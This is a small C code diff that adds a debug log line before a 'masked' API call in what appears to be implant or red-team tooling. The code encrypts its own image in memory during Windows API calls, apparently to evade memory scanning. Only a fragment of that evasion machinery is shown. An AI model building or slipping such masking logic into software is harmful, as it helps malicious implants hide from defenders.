@@ -376,8 +376,12 @@ static int gate_mask_run(FUNCTION_CALL * fc)
 #if defined(_M_X64) && defined(BOFWIN_ENABLE)
 	/* ExitThread never returns: no watchdog, or its timer thread would put
 	 * the image back in plaintext right after the session died */
-	int served = bofwin_call((void *)fc->functionPtr, fc->args, fc->numOfArgs, &fc->retValue,
-	                         fc->function == GATE_API_EXITTHREAD ? 0 : GATE_MASK_WATCHDOG_MS);
+	int served;
+	/* logged BEFORE the window: the probes below are written from behind
+	 * it, and a call that never returns (ExitThread) leaves none of them */
+	KD("gate: masking api=", fc->function);
+	served = bofwin_call((void *)fc->functionPtr, fc->args, fc->numOfArgs, &fc->retValue,
+	                     fc->function == GATE_API_EXITTHREAD ? 0 : GATE_MASK_WATCHDOG_MS);
 	KD(served ? "gate: masked api=" : "gate: mask unserved api=", fc->function);
 	KD(served ? "gate: masked ret=" : "gate: unserved ret=", (long)fc->retValue);
 	{
